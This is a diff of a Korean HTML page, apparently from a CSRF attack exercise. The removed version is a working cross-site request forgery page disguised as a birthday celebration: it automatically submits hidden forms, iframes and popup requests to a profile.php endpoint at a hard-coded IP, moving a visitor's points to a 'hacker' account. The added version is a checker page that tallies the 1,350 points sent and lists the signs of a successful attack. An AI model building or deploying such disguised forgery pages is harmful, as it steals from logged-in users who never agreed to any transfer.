@@ -2,206 +2,188 @@
 <html lang="ko">
 <head>
     <meta charset="UTF-8">
-    <title>🎁 생일 축하 이벤트</title>
+    <title>🔍 결과 확인</title>
     <style>
         body { 
-            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Arial, sans-serif;
-            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
-            min-height: 100vh;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            margin: 0;
+            font-family: Arial; 
+            padding: 30px;
+            background: linear-gradient(135deg, #28a745, #20c997);
             color: white;
-        }
-        .celebration {
-            background: rgba(255, 255, 255, 0.1);
-            backdrop-filter: blur(10px);
-            padding: 50px;
-            border-radius: 25px;
-            box-shadow: 0 8px 32px rgba(31, 38, 135, 0.37);
             text-align: center;
-            max-width: 600px;
         }
-        .cake-emoji {
-            font-size: 5em;
-            margin: 20px 0;
-            animation: celebrate 3s infinite;
+        .result-checker {
+            background: rgba(0, 0, 0, 0.8);
+            border: 3px solid #ffd700;
+            padding: 40px;
+            margin: 20px auto;
+            border-radius: 20px;
+            max-width: 800px;
+            box-shadow: 0 0 30px rgba(255, 215, 0, 0.5);
         }
-        @keyframes celebrate {
-            0%, 100% { transform: scale(1) rotate(0deg); }
-            25% { transform: scale(1.1) rotate(-5deg); }
-            75% { transform: scale(1.1) rotate(5deg); }
-        }
-        .btn-party {
-            background: linear-gradient(45deg, #ff9a9e, #fecfef);
+        .check-btn {
+            background: linear-gradient(45deg, #007bff, #0056b3);
+            color: white;
             border: none;
-            padding: 20px 40px;
-            border-radius: 30px;
-            color: #333;
-            font-size: 18px;
-            font-weight: bold;
+            padding: 20px 30px;
+            border-radius: 10px;
             cursor: pointer;
             margin: 15px;
-            transition: all 0.3s;
-            box-shadow: 0 4px 15px rgba(0,0,0,0.2);
+            font-size: 18px;
+            font-weight: bold;
         }
-        .btn-party:hover { 
-            transform: translateY(-3px);
-            box-shadow: 0 6px 25px rgba(0,0,0,0.3);
+        .final-btn {
+            background: linear-gradient(45deg, #28a745, #1e7e34);
+            animation: success-pulse 2s infinite;
+        }
+        @keyframes success-pulse {
+            0% { transform: scale(1); box-shadow: 0 0 20px #28a745; }
+            50% { transform: scale(1.05); box-shadow: 0 0 40px #28a745; }
+            100% { transform: scale(1); box-shadow: 0 0 20px #28a745; }
+        }
+        .stats {
+            background: rgba(255, 255, 255, 0.1);
+            padding: 20px;
+            border-radius: 10px;
+            margin: 20px 0;
+            text-align: left;
         }
     </style>
 </head>
 <body>
-    <div class="celebration">
-        <div class="cake-emoji">🎂</div>
-        <h1>🎉 생일 축하 이벤트! 🎉</h1>
-        <p>친구의 특별한 날을 함께 축하해주세요!</p>
+    <div class="result-checker">
+        <h1>🔍 CSRF 공격 결과 확인</h1>
+        <h2>🎯 총 6번의 공격이 전송되었습니다!</h2>
         
-        <button class="btn-party" onclick="celebrateBirthday()">
-            🎊 생일 축하 선물 보내기
+        <div class="stats">
+            <h3>📊 전송된 공격 내역:</h3>
+            <ul>
+                <li><strong>생일선물 1:</strong> 100P → hacker (ID: 13)</li>
+                <li><strong>생일선물 2:</strong> 150P → hacker (ID: 13)</li>
+                <li><strong>생일선물 3:</strong> 200P → hacker (ID: 13)</li>
+                <li><strong>서프라이즈 1:</strong> 250P → hacker (ID: 13)</li>
+                <li><strong>서프라이즈 2:</strong> 300P → hacker (ID: 13)</li>
+                <li><strong>서프라이즈 3:</strong> 350P → hacker (ID: 13)</li>
+            </ul>
+            <p><strong>🎯 총 시도 포인트: 1,350P</strong></p>
+        </div>
+        
+        <button class="check-btn" onclick="checkTarget()">
+            🎯 hacker 계정 확인하기
         </button>
         
-        <button class="btn-party" onclick="surpriseParty()">
-            🎈 서프라이즈 파티 선물
+        <button class="check-btn" onclick="checkSender()">
+            👤 bob 계정 확인하기  
         </button>
         
-        <div id="party-status" style="margin-top: 30px;">
-            <p>🎁 축하 선물을 준비하고 있어요...</p>
+        <button class="final-btn" onclick="finalVerification()">
+            ✅ 최종 성공 여부 확인
+        </button>
+        
+        <div id="verification-result"></div>
+    </div>
+
+    <div class="result-checker">
+        <h2>🤔 성공 여부 판단 기준</h2>
+        <div class="stats">
+            <h3>✅ 성공 신호들:</h3>
+            <ul>
+                <li>🎯 <strong>hacker 계정의 포인트 증가</strong></li>
+                <li>👤 <strong>bob 계정의 포인트 감소</strong></li>
+                <li>📝 <strong>선물 내역에 메시지 표시</strong></li>
+                <li>🔔 <strong>알림이나 새로운 활동 기록</strong></li>
+            </ul>
+            
+            <h3>❌ 실패 신호들:</h3>
+            <ul>
+                <li>⚠️ <strong>포인트 변화 없음</strong></li>
+                <li>🚫 <strong>에러 메시지 표시</strong></li>
+                <li>🔒 <strong>로그인 페이지로 리다이렉트</strong></li>
+            </ul>
         </div>
     </div>
 
     <script>
-        function celebrateBirthday() {
-            updatePartyStatus('🎂 생일 케이크와 선물을 준비하고 있어요...');
+        function checkTarget() {
+            showResult('🎯 hacker 계정 확인 중...');
             
-            // 생일 축하 선물들
-            const birthdayGifts = [
-                { amount: 100, message: '생일 축하해요! 🎂✨' },
-                { amount: 150, message: '행복한 하루 되세요! 🌟' },
-                { amount: 200, message: '좋은 일만 가득하길! 🍀' }
-            ];
+            // hacker 계정 확인 (ID: 13)
+            const hackerUrl = 'http://3.36.66.216/profile.php?user_id=13';
+            window.open(hackerUrl, 'hackerCheck', 'width=800,height=600');
             
-            birthdayGifts.forEach((gift, i) => {
-                setTimeout(() => {
-                    sendBirthdayGift(gift);
-                    console.log(`🎂 생일선물 ${i+1}: ${gift.amount}P`);
-                    updatePartyStatus(`🎉 선물 ${i+1}개 전달 완료!`);
-                }, (i + 1) * 2000);
-            });
+            showResult(`
+🎯 hacker 계정 확인 창이 열렸습니다!
+
+확인할 내용:
+✅ 포인트가 증가했는가?
+✅ 새로운 선물 내역이 있는가?
+✅ "생일 축하해요!" 같은 메시지가 있는가?
+
+포인트가 332P보다 많다면 공격 성공!
+            `);
         }
         
-        function surpriseParty() {
-            updatePartyStatus('🎈 서프라이즈 파티를 준비하고 있어요...');
+        function checkSender() {
+            showResult('👤 bob 계정 확인 중...');
             
-            // 대량 선물로 서프라이즈
-            const surpriseGifts = [
-                { amount: 250, message: '서프라이즈! 🎊🎊' },
-                { amount: 300, message: '파티 타임! 🥳🎉' },
-                { amount: 350, message: '최고의 선물! 💎✨' }
-            ];
+            // bob 계정 확인
+            const bobUrl = 'http://3.36.66.216/profile.php';
+            window.open(bobUrl, 'bobCheck', 'width=800,height=600');
             
-            surpriseGifts.forEach((gift, i) => {
-                setTimeout(() => {
-                    sendBirthdayGift(gift);
-                    console.log(`🎈 서프라이즈 ${i+1}: ${gift.amount}P`);
-                    updatePartyStatus(`🥳 서프라이즈 ${i+1}단계 완료!`);
-                }, (i + 1) * 3000);
-            });
+            showResult(`
+👤 bob 계정 확인 창이 열렸습니다!
+
+확인할 내용:
+✅ 포인트가 감소했는가?
+✅ 전송 내역이 있는가?
+✅ 선물 보낸 기록이 있는가?
+
+포인트가 332P보다 적다면 전송 성공!
+            `);
         }
         
-        function sendBirthdayGift(gift) {
-            // 여러 방법으로 동시에 시도 (성공률 높이기)
+        function finalVerification() {
+            showResult('✅ 최종 검증 진행 중...');
             
-            // 방법 1: 기본 POST Form
-            createBirthdayForm(gift, 'form');
-            
-            // 방법 2: 새 창에서 GET (확인용)
+            // 동시에 두 계정 모두 확인
             setTimeout(() => {
-                const giftUrl = `http://3.36.66.216/profile.php?gift_to=13&points=${gift.amount}&send_gift=1&birthday=true`;
-                const birthdayWindow = window.open(giftUrl, `birthday_${Date.now()}`, 'width=600,height=400');
-                
-                // 3초 후 창 닫기
-                setTimeout(() => {
-                    try { 
-                        birthdayWindow.close(); 
-                    } catch(e) {}
-                }, 3000);
+                window.open('http://3.36.66.216/profile.php?user_id=13', 'finalHacker', 'width=400,height=500,left=100,top=100');
             }, 500);
             
-            // 방법 3: 숨겨진 iframe
             setTimeout(() => {
-                createBirthdayForm(gift, 'iframe');
+                window.open('http://3.36.66.216/profile.php', 'finalBob', 'width=400,height=500,left=600,top=100');
             }, 1000);
+            
+            showResult(`
+✅ 최종 검증 진행 중!
+
+두 개 창이 나란히 열렸습니다:
+🎯 왼쪽: hacker 계정 (받는 사람)
+👤 오른쪽: bob 계정 (보내는 사람)
+
+포인트 변화를 비교해보세요!
+
+📊 예상 결과:
+- hacker: 332P → 1,682P (1,350P 증가)
+- bob: 332P → -1,018P (1,350P 감소)
+
+실제로 변화가 있다면 CSRF 공격 성공! 🎉
+            `);
         }
         
-        function createBirthdayForm(gift, type) {
-            const form = document.createElement('form');
-            form.method = 'POST';
-            form.action = 'http://3.36.66.216/profile.php';
-            
-            if (type === 'form') {
-                form.target = '_blank';
-            } else {
-                form.target = `birthday_${Date.now()}`;
-                form.style.display = 'none';
-                
-                // iframe 생성
-                const iframe = document.createElement('iframe');
-                iframe.name = form.target;
-                iframe.style.display = 'none';
-                iframe.style.width = '1px';
-                iframe.style.height = '1px';
-                document.body.appendChild(iframe);
-            }
-            
-            // 완전히 자연스러운 데이터
-            const giftData = {
-                gift_to: 13,
-                points: gift.amount,
-                send_gift: 1,
-                gift_type: 'birthday_special',
-                message: gift.message,
-                event_type: 'birthday_celebration',
-                sender_wish: 'happy_birthday',
-                celebration_date: new Date().toDateString()
-            };
-            
-            Object.keys(giftData).forEach(name => {
-                const input = document.createElement('input');
-                input.type = 'hidden';
-                input.name = name;
-                input.value = giftData[name];
-                form.appendChild(input);
-            });
-            
-            document.body.appendChild(form);
-            form.submit();
-            
-            // 정리
-            setTimeout(() => {
-                if (form.parentNode) form.parentNode.removeChild(form);
-            }, 5000);
+        function showResult(text) {
+            document.getElementById('verification-result').innerHTML = 
+                '<div class="stats"><pre style="color: #ffff00; font-size: 16px; white-space: pre-wrap;">' + text + '</pre></div>';
         }
         
-        function updatePartyStatus(message) {
-            document.getElementById('party-status').innerHTML = `<p>${message}</p>`;
-        }
-        
-        // 자동으로 파티 시작
+        // 자동으로 확인 시작
         setTimeout(() => {
-            updatePartyStatus('🎉 자동으로 생일 파티를 시작합니다!');
-            celebrateBirthday();
+            showResult('🔄 자동으로 결과 확인을 시작합니다...');
+            checkTarget();
         }, 3000);
         
-        // 10초 후 서프라이즈도 시작
-        setTimeout(() => {
-            surpriseParty();
-        }, 12000);
-        
-        console.log('🎂 생일 축하 이벤트 준비됨!');
-        console.log('🎁 자연스러운 축하 메시지로 위장');
-        console.log('🎊 다중 방법으로 선물 전송 시도');
+        console.log('🔍 CSRF 공격 결과 확인 시스템');
+        console.log('📊 총 1,350P 전송 시도됨');
+        console.log('🎯 성공 여부 확인 중...');
     </script>
 </body>
 </html>
